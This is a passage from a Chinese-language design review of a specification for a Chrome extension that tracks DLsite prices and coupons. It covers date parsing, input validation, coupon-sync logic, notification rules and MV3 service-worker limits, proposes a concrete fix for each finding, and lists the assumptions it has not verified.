  > - 比較列改成：「全部一起買，只用效果最好的一張券：A ¥7,094（B 只折 ¥330、C 只折 ¥330）」。
  > - p10 併入 #3（或任一單），訂單變成 3 單，表格與合計列對應修改；在表格下加一句「不用券的作品會併入其他訂單，減少結帳次數」。
  > - 刪掉第 514～515 行多餘的表頭；§12.2 第二個「4.」改成「5.」。

### C-5　逐件捨去用浮點數相乘會少算 1 圓（低）

- **章節**：§10.1、§12.2「`Σ floor(現價ᵢ × 折扣率)`」
- **問題**：若程式寫成 `Math.floor(price * (pct / 100))` 或 `Math.floor(price * 0.35)`，會受浮點誤差影響。
- **反例**（Node.js 實測）：`180 × (35 / 100) = 62.99999999999999`，`Math.floor` 得 62；正確應為 63。`90 × 0.70` 同樣得 62.999…。
- **建議修正**（貼進 §12.2）：
  > 折扣率券的單件折扣一律以整數計算：`Math.floor(price * pct / 100)`，`price` 與 `pct` 都是整數（`pct` 為 30 代表 30%）。單元測試加入 `(180, 35) → 63`、`(90, 70) → 63`。

### C-6　日期與時區：JST 字串、`limit_date` 單位、`discount_end_date` 補年份規則（中）

- **章節**：§5.1 `discount_end_date`、§5.3 `Coupon.startsAt／expiresAt`、§5.4 `start_date／end_date／limit_date`、§10
- **問題**：
  1. `start_date`／`end_date` 是 `2026-11-28 23:59:59` 這種沒有時區的字串。直接 `new Date("2026-11-28 23:59:59")` 在 Chrome 會被當成**本機時間**。Node.js 在台灣時區實測結果是 `Sat Nov 28 2026 23:59:59 GMT+0800`，比正確的 JST 晚 1 小時，到期提醒和「24 小時內結束」都會偏移。
  2. `limit_date` 是 Unix **秒**（實測 `1796227116` = 2026-12-02T15:58:36Z = JST 2026-12-03 00:58:36，與 §10.2 表格一致），但 `Coupon.expiresAt` 型別是 `string`，註解又寫「limit_date（Unix 秒）」，實作時容易把秒直接當毫秒用，算出 1970 年。
  3. `limit_date` 可能是 `null`（例如沒有領券期限的券，未驗證），規格沒有寫退回規則。
  4. `discount_end_date` 沒有年份，§10 只寫「跨年如何補年份」待確認，沒有給規則。另外 `2/29` 在非閏年用 `new Date` 會自動變成 3/1。
- **建議修正**（新增 §5.5「日期解析規則」，實作放在 `lib/dates.ts`）：
  > - DLsite 的日期字串一律視為 JST。`YYYY-MM-DD HH:mm:ss` 先用 `^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$` 嚴格比對，再轉成 `YYYY-MM-DDTHH:mm:ss+09:00` 解析。**禁止把沒有時區的字串直接丟給 `new Date()`**，ESLint 加規則或包一層 `parseJst()`。
  > - 本機一律存 UTC 的 ISO 字串（`2026-12-02T15:58:36.000Z`），顯示時轉成使用者時區，並可加註「日本時間 12/3 00:58」。
  > - `limit_date`：Unix 秒，乘 1000 後轉 ISO。`expiresAt = min(limit_date, end_date)`；`limit_date` 為 `null` 時用 `end_date`；兩者都沒有就視為解析失敗。
  > - `discount_end_date`（`MM/DD HH:mm`）：以 `checkedAt` 在 JST 的年份 `y` 建立候選日期；若候選早於 `checkedAt − 2 天`，改用 `y + 1`。月、日不合法（含非閏年的 2/29）就當作「截止時間不明」，不顯示也不觸發 `ending`。若 API 回傳含年份的完整格式，直接解析。
  > - 單元測試：12/30 查價看到 `12/31 23:59` → 同年；12/30 查價看到 `01/02 23:59` → 隔年；JST 1/1 00:30 查價看到 `12/31 23:59`（CDN 快取的舊資料）→ 前一年；非閏年看到 `02/29` → 不明。

### C-7　數字欄位的型別轉換與逐筆驗證（中）

- **章節**：§3.2「欄位不符就當作查詢失敗」、§5.4（`discount`、`maximum_applicable_price` 是字串；`price_sum` 是數字或陣列）
- **問題**：
  1. 直覺寫法 `z.coerce.number()` 會把 `null` 變 0、`""` 變 0、`true` 變 1。`maximum_applicable_price` 只有同人券有值，其他券若回傳 `null`，coerce 成 0 後，所有作品都「超過單價上限」，這張券在試算裡永遠不能用，而且不會報錯。
  2. `price_sum` 實測有 `0` 和 `[1200]`，但陣列有多個元素時代表什麼不知道。若取第一個或最大值，可能算錯門檻。
  3. §3.2 的「欄位不符就當作查詢失敗」若套在整個優惠券陣列上，DLsite 新增一種 `condition_type`，整次同步就失敗，連原本正常的 6 張券都讀不到。
- **建議修正**（貼進 §3.2 或 §5.4）：
  > - 禁止使用 `z.coerce`。字串數字用：
  >   `const intLike = z.union([z.number().int(), z.string().regex(/^\d+$/).transform(Number)]);`
  >   可為空的欄位明確寫 `.nullable()`，`null` 在轉成本機模型時變成 `undefined`（代表「沒有這個條件」），不是 0。
  > - `price_sum`：接受 `intLike`、`[]`、`[intLike]`；`null` 或 `[]` 視為 0；陣列超過 1 個元素時，這張券標成「條件無法解析」。
  > - 陣列逐筆驗證：先驗證最外層是陣列，再對每張券 `safeParse`。成功的保留，失敗的記下 `coupon_id` 與原因並在 popup 顯示「有 N 張券無法解析」。只有最外層不是陣列時才算整次同步失敗。
  > - 不認得的 `condition_type`、`discount_type`：保留這張券供顯示，但標記 `plannerUsable: false`，試算不使用，並在畫面上說明原因。
  > - 商品 API 同樣逐筆驗證：100 個作品裡有 1 個欄位怪異，只讓那一件失敗。

### C-8　優惠券 API 的「未登入」判斷不可靠，也沒有區分「沒有券」和「同步失敗」（中）

- **章節**：§5.4 ⚠️ 段落、F14、§11「讀不到時保留上次的資料」
- **問題**：
  1. 規格說「未登入時會被導向 `login.dlsite.com`，回傳登入頁 HTML，`JSON.parse` 失敗就當作未登入」。但 content script 的 fetch 在 MV3 下受頁面的 CORS 規則約束；從 `www.dlsite.com` 被導向到另一個子網域 `login.dlsite.com`，屬於跨來源轉址，若登入頁沒有 CORS 標頭，fetch 很可能直接丟 `TypeError`，根本拿不到 HTML（未驗證）。
  2. 登入狀態下沒有任何券時，API 大概回傳 `[]`（未驗證）。如果把「解析失敗」和「`[]`」都當成「沒有券」，一次網路錯誤就會把本機存的券清空；反過來，若把 `[]` 當成失敗，用完最後一張券後本機會一直留著它。
  3. 多個 DLsite 分頁同時開啟時，每個分頁的 content script 都可能同時發起同步。
- **建議修正**（取代 §5.4 ⚠️ 段落的後半）：
  > - 請求設定 `redirect: 'manual'`。判斷順序：
  >   | 結果 | 判定 | 本機資料 |
  >   |---|---|---|
  >   | `response.type === 'opaqueredirect'`，或 `response.url` 的 host 不是 `www.dlsite.com` | 未登入 | 保留，標示「未登入，上次同步：…」 |
  >   | fetch 丟例外、HTTP 狀態不是 200、內容超過 1 MB | 同步失敗 | 保留，標示失敗 |
  >   | `JSON.parse` 失敗 | 未登入或 API 改版（兩者無法區分） | 保留，標示「無法讀取」 |
  >   | 最外層是陣列（含 `[]`） | 成功 | 以這次結果**整批取代**本機的券 |
  >   | 最外層不是陣列 | API 改版 | 保留，標示失敗 |
  > - 同步排程由 background 決定：content script 先送 `shouldSyncCoupons`，background 檢查距離上次成功同步是否已超過 6 小時、以及是否已有其他分頁正在同步（在 `chrome.storage.session` 記錄 `couponSyncLock`，2 分鐘過期），回覆允許才發請求。
  > - 「未登入時 fetch 的實際行為」（拿到 HTML、`opaqueredirect` 或例外）列入 §10 待驗證。

### C-9　通知去重規則會漏通知，也會誤發通知（中）

- **章節**：§6、§5.3 `NotifiedKey`
- **問題與反例**：
  1. **`lowest` 規則幾乎永遠成立**：「現價 ≤ 自己紀錄的最低價」，而自己的紀錄包含這次查到的價格。反例：一件從沒打折過的 ¥1,980 作品，DLWatcher 查不到（新作品），第一次查價後 `priceLog` 只有 ¥1,980，`1980 ≤ 1980` 成立，馬上跳出「達到史低」。
  2. **`campaign_id` 可能是空的**：不是活動的個別折扣、`target` 規則（使用者自己設的目標價，和活動無關）都沒有 `campaign_id`。若用空字串當 key，同一作品之後所有的非活動折扣都不會再通知；若每次都當成新的，就每 6 小時通知一次。
  3. **只看「有沒有通知過」，沒有「重新觸發」**：價格低於目標價 → 通知 → 回到原價 → 再次低於目標價（沒有 `campaign_id`）時，依現行規則不會再通知。
  4. **`deeper`**：同一檔活動裡折扣加深兩次，因為 key 只有 `id + rule + campaignId`，第二次不會通知。
  5. **`couponExpiring`**：`NotifiedKey` 要求 `campaignId`，但券沒有活動編號。
  6. **合併通知的點擊目標不明**（同 S-10）。
  7. **第一次查價**：作品在打折時加入追蹤，沒有「從原價變成打折」的轉換，`sale` 永遠不會觸發，但 `lowest`／`target` 會在加入當下觸發。規格沒有說這是不是預期行為。
  8. `notified` 沒有清理規則，會一直變大。
- **建議修正**（取代 §6 表格下方的第一點，並修改 `NotifiedKey`）：
  > - 通知改成「**狀態轉換才發**」：每件作品每條規則記錄上次的條件結果；條件從不成立變成成立時才通知；條件變回不成立時重新上膛。
  > - 「一段優惠」的識別 `episodeKey` = `campaign_id` ?? `discountEnd` ?? `"start:" + 第一次看到這次打折的日期`。去重 key：
  >   | 規則 | key |
  >   |---|---|
  >   | `sale`、`lowest`、`ending` | `id + rule + episodeKey` |
  >   | `target` | `id + rule + targetPrice + episodeKey`（沒打折時 `episodeKey` 用「這次跌破目標價的日期」） |
  >   | `deeper` | `id + rule + episodeKey + discountRate` |
  >   | `couponExpiring` | `couponId + expiresAt` |
  > - `lowest` 的比較基準 = min(DLWatcher 史低, 自己紀錄中**這段優惠開始之前**的最低價)。沒有任何先前紀錄而且 DLWatcher 也沒有資料時，不觸發 `lowest`。
  > - 剛加入追蹤的作品，第一次查價只建立基準，不發任何通知（使用者當下就在看這個作品）。
  > - 同一次查價裡同一件作品符合多條規則，只發一則，內文列出全部符合的規則；`ending` 不單獨再發。
  > - `NotifiedKey` 改成 `{ key: string; at: string }`；超過 180 天的紀錄在每次排程時刪除。

### C-10　章節之間的矛盾（中）

- **章節**：§1.2、§3.3、§4、§5.3、§5.4、§8、§9 M7、§10.1、§12.1、F2、F14
- **問題**：
  | # | 矛盾 | 說明 |
  |---|---|---|
  | a | §1.2「不讀取點數餘額以外的帳號資料」vs §3.3「只限三樣：購物車、優惠券、點數」vs F14 讀券 | 照 §1.2 字面，讀券和購物車都違反範圍。 |
  | b | §3.3 要讀點數餘額，但全文沒有任何功能或 API 說明怎麼讀、用在哪裡 | §12.2 第 4 點說點數不影響分單，v1 似乎根本不需要。 |
  | c | §4「優惠券頁面：讀取持有的優惠券」、§8 `coupon.content.ts`「讀取我的優惠券頁面」、`coupons/parse.ts`「優惠券頁面解析」、M7「解析我的優惠券頁面…打開優惠券頁面後」vs F14／§5.4「在任何 DLsite 頁面以同源請求呼叫 API，不用解析 HTML」 | 實作的人不知道要做哪一個。 |
  | d | §10.1「同步優惠券時要切換所有樓層並勾選 R18」vs §5.4「一次回傳全部樓層、包含 R18，篩選只是前端過濾」 | §10.1 那句是讀網頁時的說法，用 API 時不適用。 |
  | e | §5.4「實測 6 張全部回傳」、§10.1「帳號持有 6 張券」「6 張全是 `is_multiple_use: true`」、§12.1「目前看到的都是」vs §10.2 的一次性 ¥400 定額券 | 實際是 7 張：6 張可重複使用的折扣率券 + 1 張一次性定額券。 |
  | f | §5.3 `CouponFacts` 註解「存在 `PriceSnapshot` 裡」，但 `PriceSnapshot` 沒有這些欄位 | 試算需要的 `customGenres`、`siteId`、`noReduction`、`isDiscount` 都無處可存。 |
  | g | §10.1 說「資料模型加上 `floors`、`workFormats`、`minItems`」，但 `Coupon` 沒有 `workFormats` | 指定作品形式的券無法表達。 |
  | h | F2 要讀購物車頁面 vs §3.4 測試禁止 `/cart` | 若 F2 用 fetch 讀購物車會違反白名單；應明確寫成「只讀使用者打開的購物車頁面 DOM」。 |
  | i | §5.3 `TrackedItem.site`（從網址判斷）vs `CouponFacts.siteId`（API 的 `site_id`） | 兩者可能不同（例如用 `maniax` 路徑查 `home` 的作品，§10 也提到），試算應以 API 的 `site_id` 為準。 |
  | j | §5 小節順序是 5.1 → 5.4 → 5.2 → 5.3 | 不影響內容，但引用時容易找錯。 |
- **建議修正**：
  > - §1.2 改成：「帳號資料只讀兩樣：購物車裡的作品編號（只讀你打開的購物車頁面）、持有的優惠券（§5.4 API）。地址、付款方式、購買紀錄、點數餘額一律不讀。」§3.3 第 3 點同步改成兩樣。（若日後真的要讀點數，再另外寫來源與用途。）
  > - §4 圖改成「任何 DLsite 頁面：呼叫優惠券 API（F14）」；§8 的 `coupon.content.ts` 併入 `dlsite.content.ts`，`coupons/parse.ts` 說明改成「優惠券 API 回應解析」；M7 完成標準改成「在任一 DLsite 頁面觸發同步後，擴充功能裡的券和『マイページ → クーポン管理』顯示的一致」。
  > - §10.1 刪掉「同步時要切換所有樓層並勾選 R18」那一列，或改成「網頁上要勾選才看得到，API 不需要」。
  > - 券的張數統一為 7 張，§10.1 改成「7 張中 6 張可重複使用」，§12.1 刪掉「（目前看到的都是）」。
  > - `PriceSnapshot` 加上 `couponFacts: CouponFacts` 與 `isDiscount: boolean`；`Coupon` 加上 `workFormats?: string[]`（實際欄位名列入 §10.2 待確認）。
  > - F2 說明加上「不發 fetch，只讀頁面 DOM」。
  > - §5 小節依 5.1 → 5.2 → 5.3 → 5.4 重新排序。

### C-11　`work_image` 是協定相對網址，在擴充功能頁面會失效（低）

- **章節**：§5.1 `work_image`（`//img.dlsite.jp/...`）、§5.3 `TrackedItem.imageUrl`
- **問題**：協定相對網址在 DLsite 頁面裡會解析成 `https://img.dlsite.jp/...`，但在 popup、儀表板、試算頁（`chrome-extension://` 來源）會解析成 `chrome-extension://img.dlsite.jp/...`，圖片全部載不出來。
- **建議修正**：存入 `imageUrl` 前正規化：`//` 開頭補 `https:`，再套用 S-2 的 `https://img.dlsite.jp/` 開頭檢查。（DLsite 圖片是否檢查 Referer 未驗證，若會擋，擴充功能頁面需要用 `referrerPolicy` 調整或改顯示預設圖。）

### C-12　限次券的剩餘次數語意未確認；展開沒有上限（低）

- **章節**：§5.3 `usage`、§12.1、§12.2 第 3 步
- **問題**：`limited_usage_count`／`limited_usage_limit` 目前都是 `null`，`count` 是「已用次數」還是「剩餘次數」不知道；規格直接假設 `uᵢ = limit − used`。另外「次數大於 1 的限次券展開成 `uᵢ` 張」，若 `uᵢ` 很大（例如 99），`f` 會多出 99 層 3ⁿ 的運算。
- **建議修正**：
  > - `usage` 的語意列入 §10.2 待確認（新增第 i 項），確認前若兩個欄位都有值，以 `max(0, limit − count)` 計算並在試算頁標示「次數依推測計算」。
  > - 展開數量取 `min(uᵢ, n)`（一張券最多用在 n 單），並且 `uᵢ ≥ n` 的券直接放進 `R` 當成可重複使用處理。
  > - `is_multiple_use: false` 且 `usage` 為空 → `uᵢ = 1`。

---

## 三、實作可行性

### F-1　F14 帶 cookie 的請求：content script 可行，service worker 未驗證；popup「立即同步」需要有 DLsite 分頁（中）

- **章節**：F14、§5.4、§4
- **分析**：
  - **content script**：在 `https://www.dlsite.com` 頁面裡對同一來源的 `/home/mypage/coupon/list/ajax` 發 fetch，預設 `credentials: 'same-origin'` 會帶上 cookie，請求和頁面自己發的完全一樣，SameSite 不會擋。這條路可行，與規格一致。
  - **background service worker**：有 host permission 時可以用 `credentials: 'include'` 發請求；Chrome 對「有 host permission 的擴充功能所發的請求」在 SameSite 上視為同站（印象如此），但使用者若開啟「封鎖第三方 Cookie」或日後 Chrome 調整政策，是否仍帶 cookie **未驗證**。另外從 background 發帶 cookie 的請求，等於把帳號權限交給 background 任何程式碼，違反 S-3「只有 content script 能呼叫 `couponList`」的設計。
  - **popup「立即同步」**：popup 是 `chrome-extension://` 來源，不能發同源請求。規格沒有說沒有 DLsite 分頁時怎麼辦。
- **建議修正**（貼進 F14）：
  > 「立即同步」的流程：popup 請 background 找一個已開啟的 `https://www.dlsite.com/*` 分頁（`chrome.tabs.query`，host permission 讓我們看得到這些分頁的網址），用 `chrome.tabs.sendMessage` 請該分頁的 content script 同步。沒有 DLsite 分頁時，popup 顯示「請先開啟任一 DLsite 頁面再同步」，不自動開分頁，也不從 background 發帶 cookie 的請求。

### F-2　service worker 生命週期：批次查價加延遲會被中途終止；alarms 可能在重啟後消失（中）

- **章節**：§3.1、F4、F5、§7 排程
- **分析**：
  - MV3 service worker 閒置 30 秒會被終止；呼叫擴充功能 API 或收到事件會重設計時器（Chrome 110 起）。`setTimeout` 等待不算活動；單純等待 fetch 回應是否算活動未驗證。
  - DLWatcher 每件間隔 2 秒，追蹤 100 件就是 200 秒以上；若中間沒有任何擴充功能 API 呼叫，可能在半途被終止，記憶體裡的進度全部消失。§3.1 的退避狀態（「連續失敗 3 次暫停 6 小時」）如果只存在變數裡，service worker 重啟後就忘了。
  - `chrome.alarms` 官方文件說明「通常會保留到擴充功能更新，但不保證，瀏覽器重啟時可能被清除」。週期最短 30 秒（Chrome 120 起），6 小時與 1 小時都沒問題。
- **建議修正**（新增 §4.1「背景工作」）：
  > - 查價佇列存在 `chrome.storage.local`（`queue: { source, ids[], nextIndex, nextAt }`）。每處理完一件就把進度寫回 storage（這個 API 呼叫同時會重設閒置計時器）。
  > - 每次被 alarm 喚醒最多處理 60 秒，還有剩就設一次性的 `drain` alarm（`delayInMinutes: 0.5`）繼續；service worker 被終止也能從 `nextIndex` 接著做。
  > - 退避狀態（每個來源的連續失敗次數、暫停到何時）存在 `chrome.storage.local`。
  > - `runtime.onInstalled`、`runtime.onStartup`，以及 service worker 每次啟動時，都用 `chrome.alarms.get` 檢查排程是否存在，不在就重建；另外記錄 `lastRunAt`，啟動時若距離上次超過週期就立刻排一次。
  > - 所有事件監聽器（`alarms.onAlarm`、`runtime.onMessage`、`contextMenus.onClicked`、`notifications.onClicked`）都在 `background.ts` 最上層同步註冊。

### F-3　fetch 無法設定 User-Agent（中）

- **章節**：§3.1「所有請求帶固定的 User-Agent」
- **分析**：Chrome 不允許用 fetch 的 `headers` 覆寫 `User-Agent`（Chromium 長期未實作，實作前在 M1 驗證一次）；content script 發的優惠券請求更不應該改 header，否則和頁面自己的請求不同，反而顯眼。要做到只能加 `declarativeNetRequestWithHostAccess` 權限，用 `modifyHeaders` 規則改寫，代價是多一個權限，而且容易改到使用者自己的瀏覽請求。
- **建議修正**（取代 §3.1 第 3 點前半）：
  > 不自訂 User-Agent（瀏覽器不允許，也不值得為此多要權限）。用請求頻率限制與快取來節制流量。遇到 HTTP 429 或 5xx 就用指數退避（1 分、2 分、4 分），連續失敗 3 次就暫停該來源 6 小時，狀態存在 `chrome.storage.local`。

### F-4　「加入購物車」偵測：點擊不等於加入成功，也有偵測不到的路徑（中）

- **章節**：F1、F2、§10「加入購物車按鈕」
- **分析**：
  - 按鈕是帶 `btn_cart` class 的連結。點擊可能因為未登入、已在購物車、需要選版本等原因沒有真的加入；中鍵或 Ctrl＋點擊會在新分頁開啟連結（若加入購物車是 GET，新分頁也會加入，但原頁面的 `click` 事件不會觸發，要聽 `auxclick`）。
  - 列表頁（搜尋、排行榜）可能也有加入購物車按鈕，作品編號要從按鈕附近的元素取得，結構未驗證。
  - 購物車也會在其他分頁、其他裝置或 DLsite App 裡變動，content script 不可能全部看到。
- **建議修正**（取代 F1 說明）：
  > - content script 在 `document` 上以 capture 階段監聽 `click` 與 `auxclick`，用 `selectors.ts` 的選擇器判斷目標是否為加入購物車按鈕（事件委派，動態載入的按鈕也能偵測），只處理 `isTrusted` 事件。
  > - 作品編號優先從按鈕的 `href` 或 data 屬性用 S-6 的規則取出；取不到再用頁面網址；都取不到就放棄，不掃頁面文字。
  > - 點擊即視為「想買」並加入追蹤（`source: 'cart'`），不等待加入成功；F2 在使用者打開購物車頁面時補上漏掉的作品。從購物車移除作品不會自動取消追蹤。
  > - 儀表板說明：在其他裝置或 App 加入購物車的作品，要打開一次網頁版購物車才會同步。
  > - §10 新增：列表頁的加入購物車按鈕結構、加入購物車是否為 GET 連結。

### F-5　`chrome.storage.session` 預設不開放給 content script（低）

- **章節**：§3.5
- **分析**：`chrome.storage.session` 預設的存取層級是 `TRUSTED_CONTEXTS`，content script 讀不到，除非呼叫 `setAccessLevel({ accessLevel: 'TRUSTED_AND_UNTRUSTED_CONTEXTS' })`。配額是 10 MB（Chrome 112 起）。臨時查詢的結果若含整段走勢，數百件就可能接近上限。
- **建議修正**（貼進 §3.5）：
  > `chrome.storage.session` 維持預設存取層級，只有 background 讀寫；作品頁的徽章與「查史低」按鈕透過 `chrome.runtime.sendMessage({ type: 'lookup', id })` 向 background 取結果。快取最多保留 200 件，超過時刪掉最舊的。

### F-6　service worker 沒有 DOM API；Web Worker 只能從擴充功能頁面建立（低）

- **章節**：§4、§8 `planner/worker.ts`、§7
- **分析**：
  - service worker 可以用 IndexedDB（`idb` 可用）、`fetch`、`chrome.*`；**不能**用 `DOMParser`、`document`、`localStorage`、`URL.createObjectURL`，也不能建立 `Worker`。所以 HTML 去除（S-1）、圖表、試算都不能放在 background。
  - 試算頁（擴充功能頁面）可以建立 module worker：`new Worker(new URL('./worker.ts', import.meta.url), { type: 'module' })`，來源是擴充功能自己，符合 `script-src 'self'`。WXT 是否會正確打包 worker 檔案未驗證。
- **建議修正**（貼進 §12.2 表格下方）：
  > 試算只在試算頁執行，不經過 background。n ≥ 13 時在 Web Worker 計算；M8 第一步先確認 WXT 能打包 worker，不行就改成在主執行緒分段計算（每 50 ms 用 `setTimeout` 讓出一次），n 上限維持 15。

### F-7　F13「小視窗」沒有指定做法（低）

- **章節**：F13
- **分析**：右鍵選單的事件在 service worker 收到，service worker 無法自己畫畫面。可行的做法有三種：(1) 通知 content script 在頁面上畫一個 shadow DOM 浮動框；(2) `chrome.windows.create({ type: 'popup', url: 'lookup.html?id=…', width: 420, height: 520 })` 開一個擴充功能自己的小視窗；(3) `chrome.action.openPopup()`，但它是否能從右鍵選單事件呼叫未驗證。
- **建議修正**：
  > F13 用 `chrome.windows.create` 開啟擴充功能自己的 `lookup.html`（`type: 'popup'`），作品編號經 S-6 驗證後放在查詢參數。這樣結果不會出現在 DLsite 頁面 DOM（符合 S-8），也不需要額外權限。

### F-8　`chrome.notifications` 在 Windows 上的限制（低）

- **章節**：F6、§6、§7
- **分析**：
  - Windows 上 Chrome 會使用系統原生通知；Windows 的「專注輔助／請勿打擾」或系統設定裡關掉 Chrome 通知時，使用者看不到，擴充功能也收不到錯誤（細節未驗證）。
  - `type: 'basic'` 必須提供 `iconUrl`。文件說明 `iconUrl` 可用 data URL、blob URL 或擴充功能內的檔案；遠端網址能否直接使用未驗證，而 service worker 無法用 `URL.createObjectURL` 產生 blob URL。
  - 按鈕最多 2 個；內文太長會被系統截斷。
- **建議修正**（貼進 §6）：
  > 通知一律用擴充功能內建圖示，不顯示作品縮圖。popup 與儀表板另外顯示「最近的通知」列表，即使系統通知被擋也看得到。設定頁加一句「如果收不到通知，請確認 Windows 設定 → 系統 → 通知裡的 Google Chrome 已開啟」。

### F-9　storage 並行寫入會遺失資料；IndexedDB 版本升級（低）

- **章節**：§5.3、§8 `storage.ts`
- **分析**：`items`、`snapshots` 都是一個 key 存整份資料。background 查價寫入 `snapshots` 的同時，儀表板修改目標價、content script 觸發加入追蹤，三方各自「讀 → 改 → 寫」，後寫的會蓋掉先寫的。IndexedDB 升級版本時，若儀表板還開著舊版連線，升級會被 `blocked`。
- **建議修正**（貼進 §8 `storage.ts` 說明）：
  > 所有寫入都經過 background（單一寫入者），其他頁面用訊息要求修改；background 內部用一個 Promise 佇列讓寫入依序執行。頁面用 `chrome.storage.onChanged` 更新畫面。IndexedDB 連線處理 `versionchange` 事件：收到就關閉連線並提示重新整理頁面。

---

## 四、建議修改 SPEC.md 的項目（依優先順序）

| 順序 | 修改 | 對應發現 | 章節 |
|---|---|---|---|
| 1 | 演算法分成 `R`／`L` 兩組券，`g` 只用 `bestR`；展開次數取 `min(uᵢ, n)`；`save` 預先算表 | C-1、C-12 | §12.2 |
| 2 | 新增「HTML 欄位只轉純文字（`DOMParser`）」與「URL 一律由程式自己組、圖片只接受 `img.dlsite.jp`」規則，加 ESLint 與收緊的 CSP | S-1、S-2、C-11 | §3.2 |
| 3 | 改寫 §3.4：唯一的 `apiGet`、路徑完全比對、端點表（`credentials`／`redirect`／呼叫位置）、行為測試 | S-3 | §3.4 |
| 4 | 新增「訊息與事件」：`isTrusted`、不聽 `postMessage`、依 `sender.origin` 分組的訊息白名單、數量上限 | S-4 | §3.2 |
| 5 | 新增 §5.5 日期解析規則（JST、`limit_date` 秒、`expiresAt = min`、補年份規則與測試） | C-6 | §5 |
| 6 | 禁止 `z.coerce`、`price_sum` 正規化、逐筆驗證、不認得的類型標為不可試算 | C-7 | §3.2、§5.4 |
| 7 | 改寫優惠券 API 回應判斷表（`redirect: 'manual'`、成功才取代、同步鎖） | C-8、F-1 | §5.4、F14 |
| 8 | 改寫 §6 通知：狀態轉換觸發、`episodeKey`、`lowest` 基準、首次查價不通知、清理 | C-9、S-10 | §6、§5.3 |
| 9 | 清掉跨章節矛盾（帳號資料範圍、優惠券來源、R18 切換、券張數、`PriceSnapshot` 欄位、`workFormats`、F2 只讀 DOM、小節順序） | C-10 | §1.2、§3.3、§4、§5、§8、§9、§10.1、§12.1 |
| 10 | 修正 §12.3 範例（C 的條件、比較列、p10 併單、多餘表頭、重複編號），並加上 tuple 排序與 `payment` 券的樓層範圍 | C-3、C-4 | §12.1～§12.3 |
| 11 | 限制「逐件挑券」捷徑的適用條件；n > 15 近似解加入定額券的局部交換 | C-2 | §12.2 |
| 12 | 新增 §4.1 背景工作：佇列存 storage、分段處理、`drain` alarm、重建 alarms、退避狀態持久化 | F-2 | §4 |
| 13 | 刪除「固定 User-Agent」 | F-3 | §3.1 |
| 14 | F10 匯入規則（大小、strict schema、可匯入欄位、不匯入券與圖片網址、`Map` 存放） | S-5 | F10 |
| 15 | 隱私補充（不 log 原始回應、fixture 去識別與掃描測試、不讀 `body.innerText`、說明 DLWatcher 會知道什麼、可關閉 DLWatcher） | S-7 | §3.3、§12.5 |
| 16 | content script 範圍與注入 UI 規則（`exclude_matches`、closed shadow root、頁面 DOM 只放公開資訊） | S-8 | §3.2 |
| 17 | F1 偵測方式（capture 階段委派、`auxclick`、點擊即追蹤、F2 補漏） | F-4 | F1、§10 |
| 18 | 作品編號 `isWorkId()` 與右鍵選單網址處理、`targetUrlPatterns` | S-6 | F13、附錄 |
| 19 | 逐件捨去用整數運算 | C-5 | §12.2 |
| 20 | manifest 加 `externally_connectable` 鎖定；`web_accessible_resources` 最小化 | S-9 | §7.1 |
| 21 | 建置與供應鏈規則（zod `jitless`、檢查發佈 manifest、lockfile、install script） | S-11 | §7 |
| 22 | 其他：徽章標示來源、regex 長度限制、回應大小上限、數字範圍 | S-12 | §3.2 |
| 23 | 平台細節：`storage.session` 由 background 代管、F13 用 `chrome.windows.create`、Web Worker 備案、通知只用內建圖示、單一寫入者 | F-5～F-9 | §3.5、§6、§8、§12.2、F13 |
| 24 | §10／§10.2 新增待驗證項目：結帳等頁面的實際路徑、未登入時 fetch 的實際行為、`payment` 券對 `distribute_targets` 以外作品的處理、`usage` 欄位語意、`workFormats` 欄位名、列表頁購物車按鈕結構、作品編號前綴清單、`externally_connectable` 空陣列寫法、WXT closed shadow root 與 worker 打包 | 各項「未驗證」 | §10 |

---

## 附註：本次沒有驗證的事

以下內容依賴實際瀏覽器或 DLsite 行為，本次只依文件與既有知識判斷，已在各條標為「未驗證」：

- React 19 對 `javascript:` URL 的處理細節；zod 4 在 MV3 CSP 下的退回行為。
- DLsite 頁面的 CSP、結帳／帳號頁的實際路徑、加入購物車是否為 GET、列表頁按鈕結構、DLsite 圖片是否檢查 Referer。
- content script 在未登入時呼叫優惠券 API 的實際結果（HTML、`opaqueredirect` 或例外）；登入但沒有券時是否回傳 `[]`。
- background service worker 帶 cookie 請求在各種 Cookie 設定下的行為；擴充功能請求是否帶 `Origin: chrome-extension://<id>`。
- `host_permissions` 的路徑是否生效、`extension_pages` CSP 是否同時約束 service worker、`externally_connectable` 空陣列寫法。
- fetch 等待是否算 service worker 的活動、`chrome.action.openPopup()` 能否從右鍵選單呼叫、`chrome.notifications` 遠端圖示與 Windows 專注輔助的行為。
- WXT 是否支援 closed shadow root、是否能正確打包 Web Worker。
